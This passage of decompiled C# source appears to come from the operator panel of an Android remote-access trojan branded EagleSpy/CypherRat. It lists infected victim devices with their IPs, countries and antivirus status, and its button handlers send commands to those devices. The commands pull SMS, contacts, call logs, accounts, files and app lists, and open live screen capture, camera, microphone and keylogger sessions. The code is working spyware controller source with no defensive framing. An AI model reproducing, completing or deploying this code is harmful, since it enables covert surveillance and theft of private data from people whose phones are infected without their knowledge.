							client.Flag,
							client.ClientName,
							client.Country,
							client.ClientAddressIP + ":" + array[1],
							client.android,
							client.Phone_model,
							Codes.BlankImage(),
							Codes.BlankImage(),
							reso.GetBattery(client.Battery),
							client.Wifi,
							"",
							client.ClientDefender,
							reso.CheckAdmin(client.IsAdminActive),
							"New",
							client.installdate
						});
						client.Row = this.ClientsWindow.Rows[index2];
						this.ClientsWindow.Rows[index2].Tag = client.UUID;
						this.ClientsWindow.Rows[index2].Cells[8].Tag = client;
						this.ClientsWindow.Rows[index2].Cells[6].Tag = client.UUID;
						this.ClientsWindow.Rows[index2].Cells[2].Tag = client.UUID;
						Data._clientRowIndices[client.UUID] = client;
						this.ClientsWindow.Rows[index2].Cells[15].Style.ForeColor = Color.Lime;
						string toolTipText = string.Concat(new string[]
						{
							"Client-Info\r\nName:",
							client.ClientName,
							"\r\nDefender:",
							client.ClientDefender,
							"\r\nFrom:",
							client.Country,
							"\r\nHost:",
							array[6],
							"\r\nip:",
							array[0],
							"\r\nAndorid:",
							client.android,
							"\r\nPort:",
							array[1],
							"\r\n"
						});
						this.ClientsWindow.Rows[index2].Cells[0].ToolTipText = toolTipText;
						if (Operators.CompareString(SpySettings.SOHW_ALERT, "Yes", false) == 0)
						{
							string msg = "Name: " + client.ClientName + "\r\nCountry: " + client.Country;
							EagleAlert.ShowCustome(msg, client.Wallpaper, Color.Black, Color.Lime);
						}
					}
				}
				this.UpdateForms(client);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003D6 RID: 982 RVA: 0x00058C2C File Offset: 0x00056E2C
	public void RemoveCard(DataGridViewRow row, string uuid)
	{
		EagleSpyMain._Closure_0024__56_002D0 arg = null;
		EagleSpyMain._Closure_0024__56_002D0 CS_0024_003C_003E8__locals0 = new EagleSpyMain._Closure_0024__56_002D0(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_row = row;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid = uuid;
		if (base.InvokeRequired)
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate()
			{
				CS_0024_003C_003E8__locals0._0024VB_0024Me.RemoveCard(CS_0024_003C_003E8__locals0._0024VB_0024Local_row, CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid);
			}));
		}
		else
		{
			try
			{
				string text = "null";
				try
				{
					if (CS_0024_003C_003E8__locals0._0024VB_0024Local_row != null)
					{
						text = Conversions.ToString(CS_0024_003C_003E8__locals0._0024VB_0024Local_row.Cells[6].Tag);
						this.ClientsWindow.Rows.Remove(CS_0024_003C_003E8__locals0._0024VB_0024Local_row);
						Dictionary<string, Client> clientRowIndices = Data._clientRowIndices;
						lock (clientRowIndices)
						{
							if (Data._clientRowIndices.ContainsKey(CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid))
							{
								Data._clientRowIndices.Remove(CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid);
							}
						}
					}
				}
				catch (Exception)
				{
				}
				if (Operators.CompareString(text, "null", false) != 0 && Operators.CompareString(text, "null", false) != 0)
				{
					string name = "Calls_Manager_" + text;
					Form form = MyProject.Application.OpenForms[name];
					string[] array = new string[]
					{
						"Close windows",
						"Disconnected ---> "
					};
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text2 = form.Text;
							form.Text = array[1] + text2;
						}
					}
					name = "Live_Screen_" + text;
					ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
					if (screenShoter != null)
					{
						screenShoter.Done(new object[]
						{
							"Connection lost..."
						});
						screenShoter.Livepicbox.Image = Resources.disconnected;
					}
					name = "SMS_Manager_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text3 = form.Text;
							form.Text = array[1] + text3;
						}
					}
					name = "Contacts_Manager_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text4 = form.Text;
							form.Text = array[1] + text4;
						}
					}
					name = "Camera_Manager_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text5 = form.Text;
							form.Text = array[1] + text5;
							((CameraManager)form).CAM0.Image = Resources.disconnected;
						}
					}
					try
					{
						name = "File_Manager_File" + CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid;
						form = MyProject.Application.OpenForms[name];
						if (form != null && !form.IsDisposed)
						{
							FileManager fileManager = (FileManager)form;
							string text6 = form.Text;
							form.Text = array[1] + text6;
							foreach (object obj in ((IEnumerable)fileManager.DGVDATA.Rows))
							{
								DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
								try
								{
									if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[4].Value, "Downloading..", false))
									{
										dataGridViewRow.Cells[4].Value = "Wating..";
									}
								}
								catch (Exception)
								{
								}
							}
						}
					}
					catch (Exception)
					{
					}
					name = "Microphone_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text7 = form.Text;
							form.Text = array[1] + text7;
						}
					}
					name = "SM_Hunter_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						string text8 = form.Text;
						form.Text = array[1] + text8;
					}
					name = "Shell_Terminal_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text9 = form.Text;
							form.Text = array[1] + text9;
						}
					}
					name = "Location_Manager_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text10 = form.Text;
							form.Text = array[1] + text10;
						}
					}
					name = "Applications_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text11 = form.Text;
							form.Text = array[1] + text11;
						}
					}
					name = "Account_Manager_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text12 = form.Text;
							form.Text = array[1] + text12;
						}
					}
					name = "informations_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text13 = form.Text;
							form.Text = array[1] + text13;
						}
					}
					name = "Keylogger_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text14 = form.Text;
							form.Text = array[1] + text14;
						}
					}
					name = "Clipboard_Manager_" + text;
					form = MyProject.Application.OpenForms[name];
					if (form != null && !form.IsDisposed)
					{
						if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], false) == 0)
						{
							form.Close();
						}
						else
						{
							string text15 = form.Text;
							form.Text = array[1] + text15;
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003D7 RID: 983 RVA: 0x000594B8 File Offset: 0x000576B8
	private void UsersToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.WU == null)
		{
			this.WU = new Win_Users();
			string path = reso.res_Path + "\\Users";
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				string[] array = directories;
				foreach (string path2 in array)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path2);
					string path3 = directoryInfo.FullName + "\\user.info";
					if (File.Exists(path3))
					{
						try
						{
							string[] array3 = File.ReadAllLines(path3);
							if (array3.Length == 3)
							{
								string text = reso.res_Path + "\\Icons\\FillEllipse\\User.png";
								this.WU.DGV0.Rows.Add(new object[]
								{
									array3[0],
									array3[2] + " /ip:" + array3[1],
									directoryInfo.Name,
									reso.GetEllImage(0, new object[]
									{
										text,
										15,
										15,
										17,
										17
									})
								});
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
			this.WU.DGV0.Columns[3].Width = 48;
			this.WU.DGV0.Columns[3].DisplayIndex = 0;
			this.WU.StartPosition = FormStartPosition.Manual;
			this.WU.Location = Codes.FixSize(this, this.WU);
			this.WU.Show();
		}
	}

	// Token: 0x060003D8 RID: 984 RVA: 0x0000206C File Offset: 0x0000026C
	private void AngelAndroidForm_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	// Token: 0x060003D9 RID: 985 RVA: 0x00002858 File Offset: 0x00000A58
	private void Button1_Click(object sender, EventArgs e)
	{
		base.Close();
	}

	// Token: 0x060003DA RID: 986 RVA: 0x000029F7 File Offset: 0x00000BF7
	private void Button2_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	// Token: 0x060003DB RID: 987 RVA: 0x00059674 File Offset: 0x00057874
	private void Panel1_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	// Token: 0x060003DC RID: 988 RVA: 0x000596AC File Offset: 0x000578AC
	private void Button3_Click(object sender, EventArgs e)
	{
		if (this.CYPHERSETTNGS == null)
		{
			this.CYPHERSETTNGS = new EagleSpySettinngs();
			DialogResult dialogResult = this.CYPHERSETTNGS.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				this.CYPHERSETTNGS.Close();
				this.CYPHERSETTNGS = null;
			}
			else
			{
				this.CYPHERSETTNGS.Close();
				this.CYPHERSETTNGS = null;
			}
		}
	}

	// Token: 0x060003DD RID: 989 RVA: 0x0005970C File Offset: 0x0005790C
	private void Label2_MouseDown(object sender, MouseEventArgs e)
	{
		this.mov = true;
		this.Min = Control.MousePosition.Y;
		this.Mx = Control.MousePosition.X;
		this.Sw = base.Width;
		this.Sh = base.Height;
	}

	// Token: 0x060003DE RID: 990 RVA: 0x00059764 File Offset: 0x00057964
	private void Label2_MouseMove(object sender, MouseEventArgs e)
	{
		if (this.mov)
		{
			base.Height = checked(Control.MousePosition.Y - this.Min + this.Sh);
		}
	}

	// Token: 0x060003DF RID: 991 RVA: 0x00002A00 File Offset: 0x00000C00
	private void Label2_MouseUp(object sender, MouseEventArgs e)
	{
		this.mov = false;
	}

	// Token: 0x060003E0 RID: 992 RVA: 0x0005979C File Offset: 0x0005799C
	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.porttext.Text))
		{
			EagleAlert.ShowWarning("Only Enter Number : 4444");
		}
		else
		{
			if (this.DGVSERVS.Rows.Count > 0)
			{
				foreach (object obj in ((IEnumerable)this.DGVSERVS.Rows))
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					if (dataGridViewRow.Tag != null && Operators.CompareString(dataGridViewRow.Tag.ToString(), this.porttext.Text, false) == 0)
					{
						EagleAlert.Showinformation("this port already added");
						return;
					}
				}
			}
			if (Conversions.ToInteger(this.porttext.Text) < 1000 | Conversions.ToInteger(this.porttext.Text) > 49151)
			{
				EagleAlert.Showinformation("Please Select port between 1000 - 49151");
			}
			else
			{
				int index = this.DGVSERVS.Rows.Add(new object[]
				{
					Resources.swtchoff,
					this.porttext.Text,
					"OFF",
					this.passtxt.Text
				});
				this.DGVSERVS.Rows[index].Cells[2].Style.ForeColor = Color.Red;
				this.DGVSERVS.Rows[index].Cells[0].Tag = "OFF";
				this.DGVSERVS.Rows[index].Tag = this.porttext.Text;
				this.porttext.Text = "";
			}
		}
	}

	// Token: 0x060003E1 RID: 993 RVA: 0x00059974 File Offset: 0x00057B74
	private void DrakeUIAvatar3_Click(object sender, EventArgs e)
	{
		if (this.DataLog.Rows.Count > 0)
		{
			this.DataLog.Rows.Clear();
		}
	}

	// Token: 0x060003E2 RID: 994 RVA: 0x000596AC File Offset: 0x000578AC
	private void DrakeUIAvatar4_Click(object sender, EventArgs e)
	{
		if (this.CYPHERSETTNGS == null)
		{
			this.CYPHERSETTNGS = new EagleSpySettinngs();
			DialogResult dialogResult = this.CYPHERSETTNGS.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				this.CYPHERSETTNGS.Close();
				this.CYPHERSETTNGS = null;
			}
			else
			{
				this.CYPHERSETTNGS.Close();
				this.CYPHERSETTNGS = null;
			}
		}
	}

	// Token: 0x060003E3 RID: 995 RVA: 0x000599A8 File Offset: 0x00057BA8
	private void DrakeUIAvatar8_Click(object sender, EventArgs e)
	{
		this.infotitlepanel.BringToFront();
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				this.bigtitletext.Text = "Dashboard";
			}
			else
			{
				this.bigtitletext.Text = "主面板";
			}
		}
		else
		{
			this.bigtitletext.Text = "لوحة رئيسية";
		}
	}

	// Token: 0x060003E4 RID: 996 RVA: 0x00059A1C File Offset: 0x00057C1C
	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003E5 RID: 997 RVA: 0x00059A68 File Offset: 0x00057C68
	private void DrakeUIAvatar9_Click(object sender, EventArgs e)
	{
		if (this.JC == null)
		{
			this.JC = new Jector();
			DialogResult dialogResult = this.JC.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				this.JC.Close();
				this.JC = null;
			}
			else
			{
				this.JC.Close();
				this.JC = null;
			}
		}
	}

	// Token: 0x060003E6 RID: 998 RVA: 0x00059AC8 File Offset: 0x00057CC8
	private void CypherRat_Deactivate(object sender, EventArgs e)
	{
		try
		{
			this.isactive = false;
			base.ActiveControl = this.ClientsWindow;
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003E7 RID: 999 RVA: 0x00059A1C File Offset: 0x00057C1C
	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Codes.ReleaseCapture();
				Codes.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003E8 RID: 1000 RVA: 0x00059B00 File Offset: 0x00057D00
	public void updaterows(object[] objs)
	{
		if (base.InvokeRequired)
		{
			EagleSpyMain.updateuiD method = new EagleSpyMain.updateuiD(this.updaterows);
			base.Invoke(method, new object[]
			{
				objs
			});
		}
		else
		{
			try
			{
				Client client = (Client)objs[0];
				DataGridViewRow dataGridViewRow = (DataGridViewRow)objs[1];
				try
				{
					if (dataGridViewRow == null)
					{
						return;
					}
					if (client.Statistics == null | Operators.CompareString(client.Statistics, "null", false) == 0)
					{
						dataGridViewRow.Cells[15].Value = "Bing...";
					}
					else
					{
						dataGridViewRow.Cells[15].Value = client.Statistics;
					}
				}
				catch (Exception)
				{
				}
				dataGridViewRow.Cells[12].Value = client.ActiveNow;
				dataGridViewRow.Cells[1].Value = client.Wallpaper;
				dataGridViewRow.Cells[0].Value = reso.GetScreen(client.Screen);
				dataGridViewRow.Cells[10].Value = reso.GetBattery(client.Battery);
				dataGridViewRow.Cells[11].Value = client.Wifi;
				if (client.isnewcall)
				{
					dataGridViewRow.Cells[9].Value = Resources.new_call;
				}
				if (client.isnewnotifi)
				{
					dataGridViewRow.Cells[8].Value = Resources.new_notifi;
				}
				if (client.IsAdminActive)
				{
					dataGridViewRow.Cells[14].Value = reso.CheckAdmin(client.IsAdminActive);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003E9 RID: 1001 RVA: 0x00059CC8 File Offset: 0x00057EC8
	private void CypherRat_Activated(object sender, EventArgs e)
	{
		try
		{
			this.isactive = true;
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060003EA RID: 1002 RVA: 0x00059CF4 File Offset: 0x00057EF4
	private void Filebtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								object[] parametersObjects = new object[]
								{
									client.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".files",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getfiles,
										Data.SPL_SOCKET,
										"files",
										Data.SPL_DATA,
										"get0"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003EB RID: 1003 RVA: 0x00059E98 File Offset: 0x00058098
	private void Smsbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".sms",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getSMS,
										Data.SPL_SOCKET,
										"sms",
										Data.SPL_DATA,
										"content://sms/"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003EC RID: 1004 RVA: 0x0005A040 File Offset: 0x00058240
	private void Contactbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".contacts",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getContacts,
										Data.SPL_SOCKET,
										"contacts"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003ED RID: 1005 RVA: 0x0005A1D4 File Offset: 0x000583D4
	private void Applicationsbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						Client client = (Client)dataGridViewRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[]
							{
								myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".apps",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.Apps,
									Data.SPL_SOCKET,
									"apps"
								}),
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003EE RID: 1006 RVA: 0x0005A328 File Offset: 0x00058528
	private void Accountbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".info",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.Account,
										Data.SPL_SOCKET,
										"account"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003EF RID: 1007 RVA: 0x0005A4BC File Offset: 0x000586BC
	private void Callsbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								object[] parametersObjects = new object[]
								{
									myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient1,
										Data.SPL_SOCKET,
										reso.domen,
										".calls",
										Data.SPL_SOCKET,
										"method",
										Data.SPL_SOCKET,
										SecurityKey.getCalls,
										Data.SPL_SOCKET,
										"calls"
									}),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003F0 RID: 1008 RVA: 0x0005A650 File Offset: 0x00058850
	private void Screenbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "Live_Screen_" + client.ClientRemoteAddress;
								ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
								if (screenShoter == null)
								{
									new ScreenShoter
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003F1 RID: 1009 RVA: 0x0005A7E4 File Offset: 0x000589E4
	private void Screenreadbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								string name = "SC_Readv2_" + client.ClientAddressIP;
								ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
								if (screenReaderV == null)
								{
									new ScreenReaderV2
									{
										Name = name,
										Title = string.Format("{0} - IP:{1}", "Screen Reader V2", client.ClientAddressIP),
										Tag = client.ClientRemoteAddress,
										classClient = client,
										Client = client.myClient,
										DownloadsFolder = client.FolderUSER
									}.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003F2 RID: 1010 RVA: 0x0005A96C File Offset: 0x00058B6C
	private void Camerabtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string[] array = client.Keys.Split(new char[]
								{
									':'
								});
								int value = 0;
								int value2 = 0;
								if (client.Isv4)
								{
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient2,
											Data.SPL_SOCKET,
											"lcm<*>",
											client.ClientRemoteAddress,
											Data.SPL_SOCKET,
											array[0],
											Data.SPL_SOCKET,
											array[1],
											Data.SPL_SOCKET,
											SecurityKey.Lockscreen,
											Data.SPL_SOCKET,
											Conversions.ToString(value),
											Data.SPL_SOCKET,
											Conversions.ToString(value2),
											Data.SPL_SOCKET,
											Data.SPL_ARRAY,
											Data.SPL_SOCKET,
											client.ClientRemoteAddress
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
								else
								{
									string name = "Camera_Manager_" + client.ClientRemoteAddress;
									CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
									if (cameraManager != null)
									{
										break;
									}
									cameraManager = new CameraManager();
									cameraManager.Name = name;
									cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
									cameraManager.classClient = client;
									if (cameraManager.classClient != null)
									{
										reso.Directory_Exist(cameraManager.classClient);
										cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
									}
									cameraManager.Client = client.myClient;
									cameraManager.classCamera = client;
									cameraManager.TempImage = new PictureBox();
									cameraManager.combotext.Visible = false;
									cameraManager.combosizes.Visible = false;
									cameraManager.Show();
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003F3 RID: 1011 RVA: 0x0005AC48 File Offset: 0x00058E48
	private void Micbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Cells[8].Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							if (client != null)
							{
								TcpClient myClient = client.myClient;
								string name = "Microphone_" + client.ClientRemoteAddress;
								Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
								if (microphone == null)
								{
									string[] array = client.Keys.Split(new char[]
									{
										':'
									});
									if (array.Length < infoServer.KeySize)
									{
										break;
									}
									object[] parametersObjects = new object[]
									{
										myClient,
										string.Concat(new string[]
										{
											SecurityKey.KeysClient1,
											Data.SPL_SOCKET,
											reso.domen,
											".microphone",
											Data.SPL_SOCKET,
											"method",
											Data.SPL_SOCKET,
											SecurityKey.resultClient,
											Data.SPL_SOCKET,
											"start",
											Data.SPL_DATA,
											array[0],
											Data.SPL_DATA,
											array[1],
											Data.SPL_DATA,
											"8000",
											Data.SPL_DATA,
											SecurityKey.MicwaveOutByte,
											Data.SPL_DATA,
											client.ClientRemoteAddress,
											Data.SPL_DATA,
											"0"
										}),
										Codes.Encoding().GetBytes("null"),
										client
									};
									client.SendMessage(parametersObjects);
								}
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x060003F4 RID: 1012 RVA: 0x0005AEA4 File Offset: 0x000590A4
	private void Keyloggerbtn_Click(object sender, EventArgs e)
	{
		if (this.ClientsWindow.SelectedRows.Count > 0)
		{
			try
			{
				foreach (object obj in this.ClientsWindow.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						if (dataGridViewRow.Tag != null)
						{
							Client client = (Client)dataGridViewRow.Cells[8].Tag;
							string name = "Keylogger_" + client.ClientRemoteAddress;
							Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
							if (client != null && keylogger == null)
							{
								keylogger = new Keylogger();
								keylogger.Name = name;
								keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
								keylogger.Client = client.myClient;
								keylogger.classClient = client;
								keylogger.DGV0.Columns[3].Width = 48;
								keylogger.DGV0.Columns[3].DisplayIndex = 0;
								keylogger.tmpAddressIP = client.ClientAddressIP;
								keylogger.tmpClientName = client.ClientName;
								keylogger.tmpCountry = client.Country;
								keylogger.tmpFolderUSER = client.FolderUSER;
								client.Keylogg = true;
								keylogger.Show();
							}
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

